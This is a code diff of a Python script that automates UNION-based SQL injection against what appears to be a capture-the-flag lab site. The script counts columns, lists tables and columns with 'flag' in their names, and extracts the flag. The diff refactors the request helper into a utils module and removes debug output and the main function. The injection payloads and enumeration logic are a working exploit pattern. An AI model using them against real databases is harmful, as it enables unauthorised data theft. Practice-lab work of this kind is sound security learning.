@@ -1,25 +1,6 @@
-import requests
-import urllib3
+
 import re
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# === Config ===
-BASE_URL = "https://ioejkjrymi.voorivex-lab.online/post.php"
-PROXIES = {
-    "http": "http://127.0.0.1:8080",
-    "https": "http://127.0.0.1:8080"
-}
-HEADERS = {
-    "User-Agent": "Mozilla/5.0"
-}
-VERIFY = False
-
-# === Reqest Helper ===
-def send(payload):
-    params = {"id": payload}
-    res = requests.get(BASE_URL, params=params, headers=HEADERS, proxies=PROXIES, verify=VERIFY)
-    return res.text
+from utils import send
 
 # === Step 1: Find number of columns ===
 def find_column_count(max_columns=15):
@@ -62,8 +43,7 @@ def get_tables(total, visible):
     print("[+] Tables in DB:")
     
     tables_html = send(payload)
-    print(tables_html)
-    
+
     table_names = re.findall(r'\bflag\w*\b', tables_html, re.IGNORECASE)
     
     if not table_names:
@@ -74,7 +54,6 @@ def get_tables(total, visible):
     print(f"[+] Found suspicious table: {table}")
     return table
 
-
 # === Step 5: Get column names of flag table ===
 def get_columns(total, visible, table): 
     print("[*] Enumerating columns in that table...")
@@ -83,7 +62,6 @@ def get_columns(total, visible, table):
     payload = f"-1 union select {','.join(cols)}--"
     print(f"[+] Columns in table {table}:")
     columns_html = send(payload)
-    print(columns_html)
     column_names = re.findall(r'\bflag\w*\b', columns_html, re.IGNORECASE)
 
     if not column_names:
@@ -100,38 +78,8 @@ def get_flag(total, visible, table, column):
     cols = ["null"] * total
     cols[visible - 1] = f"(select {column} from {table})"
     payload = f"-1 union select {','.join(cols)}--"
-    print("[+] FLAG:")
     flags_html = send(payload)
-    print("\n🎯 FLAG FOUND:")
     flag_vals = re.findall(r'\bflag\w*\b', flags_html, re.IGNORECASE)
     flag = flag_vals[0]
-    print(flag)
+    print(f"[+] FLAG: {flag} 🎯")
     return flag
-
-# === Main === 
-def main():  
-    total_columns = find_column_count()
-    if total_columns is None:
-        print("[-] Couldn't find column count")
-        exit()
-
-    visible_col = find_visible_column(total_columns)
-    if visible_col is None:
-        print("[-] Couldn't find column count")
-        exit()
-
-    table = get_tables(total_columns, visible_col)
-    if table is None:
-        print("[-] No table found. Exiting.")
-        exit()
-
-    column = get_columns(total_columns, visible_col, table) 
-    flag = get_flag(total_columns, visible_col, table, column) # ???????????????????
-    if flag is None:
-        print("[-] No flag found. Exiting.")
-        exit()
-
-
-if __name__ == "__main__":
-     main()
-    #requests.get("http://example.com", proxies=PROXIES, verify=False)
